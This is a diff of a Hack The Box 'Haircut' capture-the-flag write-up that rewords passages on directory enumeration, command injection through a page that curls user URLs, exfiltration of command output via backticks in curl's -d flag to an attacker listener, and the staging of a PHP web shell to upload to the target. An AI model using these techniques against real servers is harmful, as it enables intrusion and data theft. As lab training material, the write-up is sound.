@@ -39,9 +39,9 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 10.55 seconds
 ```
 
-The web app running on port 80 is just an image.
+The web app running on port 80 just displays an image that does not say much.
 
-Initial directories enumeration with the common list:
+Initial directories enumeration with the list `common.txt`:
 
 ```
 root@kali:~/htb/haircut# gobuster dir -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -u ${HAIRCUT}
@@ -67,7 +67,7 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 
 Interesting, there's an `/uploads` directory. Despite it does not seem very useful now, it may come handy in the future.
 
-After trying with several other lists, finally this one got a more intereseting result:
+After trying with several other lists, which was a quite frustrating process to be honest, finally this one got a more intereseting result:
 
 ```
 root@kali:~/htb/haircut# gobuster dir --url 10.10.10.24 --wordlist /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php
@@ -89,10 +89,10 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
 /exposed.php (Status: 200)
 ```
 
-The page `/exposed.php` has a text input, and when passing a URL it displays on screen the result of curling it. I tried to inject some commands but some symbols/keywords were blocked by the back-end e.g. &, ;, |, python and nc. Curl flags were not blocked, though.
+The page `/exposed.php` has a text input, and when passing a URL it apparently curls it in the back-end and displays on screen the result. I tried to inject some commands but some symbols/keywords were blocked by the back-end e.g. &, ;, |, python and nc. Curl flags were not blocked, though.
 
 ## Exploitation
-Checking `curl` man page for ways to get more information on the system or executing arbitrary code, I thought that using curl's request body (-d) could be an acceptable way of transmitting info to a listener. By leveraging backticks, commands can be executed and their results would be sent back to our listener.
+Checking the man page of `curl`, I thought that by using curl's request body (-d) it could be possible to transmit arbitrary info to a listener. By leveraging backticks, it could be possible to pass the result of a command execution to the listener. Neat!
 
 Set up listener on the attacker machine: 
 ```
@@ -120,9 +120,9 @@ drwxr-xr-x 3 root     root     4.0K May 16  2017 ..
 drwxr-xr-x 2 www-data www-data 4.0K May 22  2017 uploads
 ```
 
-It seems `uploads` may be a good place to place a web shell as `www-data` has write permissions on it. I'm going to use a PHP web shell called `Predator.php` present in this repo https://github.com/JohnTroony/php-webshells.git. Note I use that one because just to check it out, but other much simpler ones should be enough.
+It seems `uploads` may be a good place to locate a web shell as `www-data` can write to it. I'm going to use a PHP web shell called `Predator.php` available [here](https://github.com/JohnTroony/php-webshells.git). Note that other much simpler web shells should be enough, I just wanted to check that one out :)
 
-The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an http server on the attacker:
+The first step to copy the shell into the target server, is to make the shell "curleable" by exposing it through an HTTP server on the attacker:
 ```
 $ cd php-webshells
 $ python -m SimpleHTTPServer
